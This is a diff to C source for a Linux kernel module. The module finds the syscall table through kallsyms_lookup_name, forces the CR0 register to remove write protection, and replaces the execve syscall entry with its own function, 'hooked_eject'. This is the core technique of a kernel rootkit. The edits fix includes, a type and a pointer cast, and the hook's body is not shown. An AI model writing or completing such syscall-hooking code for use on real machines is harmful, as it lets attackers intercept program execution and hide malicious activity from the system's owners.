@@ -1,9 +1,10 @@
 #include<linux/kernel.h>
 #include<linux/module.h>
+//#include<linux/syscalls.h>
 #include<linux/version.h>
-#include<linux/proc_ns.h>
-#include<sys/types.h>
-#include<unistd.h>
+//#include<linux/proc_ns.h>
+//#include<sys/types.h>
+#include<linux/unistd.h>
 // execve("/usr/bin/bash", ["bash"], 0x7fff23adffb0 /* 42 vars */) = 0
 
 unsigned long cr0, orig_cr0;
@@ -41,7 +42,7 @@ static inline void write_cr0_forced(unsigned long val)
 asmlinkage long (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
 unsigned long *sys_call_table;
 
-hooking_syscall(void *hook_addr, __uint16_t syscall_offset, unsigned long *sys_call_table)
+hooking_syscall(void *hook_addr, uint16_t syscall_offset, unsigned long *sys_call_table)
 {
     unprotect_memory();
     sys_call_table[syscall_offset] = (unsigned long) hook_addr;
@@ -63,7 +64,7 @@ asmlinkage long hooked_eject(const char *pathname, char *const argv[], char *con
 }
 
 static int __init eject_init(void) {
-    sys_call_table = kallsyms_lookup_name("sys_call_table");
+    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
     orig_execve = (void*)sys_call_table[__NR_execve];
     hooking_syscall(hooked_eject, __NR_execve, sys_call_table);
 }
